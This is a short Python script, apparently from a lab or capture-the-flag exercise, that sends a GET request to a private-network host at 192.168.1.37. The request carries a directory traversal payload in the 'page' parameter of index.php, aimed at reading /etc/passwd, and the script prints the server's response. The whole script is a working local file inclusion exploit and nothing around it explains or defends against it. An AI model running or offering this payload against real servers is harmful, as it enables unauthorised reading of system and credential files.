import requests

r = requests.get('http://192.168.1.37/index.php?page=../../../../../../../../../../etc/passwd')
print(r.text)
